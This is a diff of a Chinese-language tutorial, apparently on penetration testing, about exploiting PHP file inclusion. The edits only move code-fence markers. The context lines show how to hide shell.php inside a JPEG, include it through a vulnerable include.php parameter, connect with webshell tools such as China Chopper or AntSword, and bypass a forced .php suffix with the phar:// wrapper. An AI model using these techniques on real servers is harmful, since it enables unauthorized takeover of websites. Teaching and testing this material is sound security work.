@@ -104,8 +104,9 @@ copy normal.jpg /b + shell.php /a webshell.jpg
 
 上传成功后，我们利用之前的文件包含漏洞来执行图片中的PHP代码。
 
-```
 http://target.com/include.php?file=upload/webshell.jpg
+
+```
 ```
 
 最后，使用中国菜刀或蚁剑等连接工具，连接上述URL，即可成功获取服务器权限。
@@ -164,8 +165,9 @@ http://target.com/include?file=php://filter/convert.base64-encode/resource=uploa
     ```
 3.  **上传文件**：将`test.jpg`上传到服务器。
 4.  **利用PHAR协议包含**：PHAR协议可以解析压缩包内的文件。使用以下格式进行包含：
-    ```
     http://target.com/include?file=phar://./upload/test.jpg/shell
+
+    ```
     ```
     即使后台拼接了`.php`，请求变为`phar://./upload/test.jpg/shell.php`，PHAR协议也能正确解析并执行压缩包内`shell`文件对应的PHP代码。
 
